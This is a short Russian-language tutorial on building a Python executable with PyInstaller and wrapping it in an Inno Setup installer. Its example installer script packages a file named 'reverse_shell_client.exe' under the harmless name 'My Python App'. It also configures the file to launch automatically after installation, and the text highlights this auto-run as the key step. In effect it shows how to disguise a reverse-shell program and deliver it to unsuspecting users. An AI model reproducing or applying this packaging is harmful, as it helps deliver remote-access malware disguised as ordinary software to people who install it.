# 1. Установка PyInstaller
```pip install pyinstaller```

# 2. Создание .exe
```pyinstaller --onefile your_script.py```

После этого появится:
````
dist/
    your_script.exe
````
Это уже готовый исполняемый файл

# 3. Создать установщик (.exe installer) через Inno Setup

Это создаст настоящий установщик, как у обычных программ.

1. Скачать Inno Setup

Сайт:
https://jrsoftware.org/isdl.php

Установи

2. Создай файл installer.iss

Пример:
````
[Setup]
AppName=My Python App
AppVersion=1.0
DefaultDirName={pf}\MyPythonApp
DefaultGroupName=MyPythonApp
OutputDir=output
OutputBaseFilename=MyPythonAppInstaller

[Files]
Source: "reverse_shell_client.exe"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{group}\My Python App"; Filename: "{app}\reverse_shell_client.exe"

[Run]
Filename: "{app}\reverse_shell_client.exe"; Description: "Запустить программу"; Flags: nowait postinstall skipifsilent
````

Что делает каждая секция
[Files] копирует exe в:
```C:\Program Files\MyPythonApp\```

[Run] ← САМОЕ ВАЖНОЕ
```Flags: nowait postinstall skipifsilent```

означает: программа запустится сразу после установки автоматически, без ожидания

3. Собрать установщик

Открой installer.iss → нажми Compile

Получишь:
````
output/
    MyPythonAppInstaller.exe
````
Теперь процесс такой:
1. Пользователь запускает:
````MyPythonAppInstaller.exe
↓
Устанавливает программу
↓
СРАЗУ запускается твой Python-скрипт
````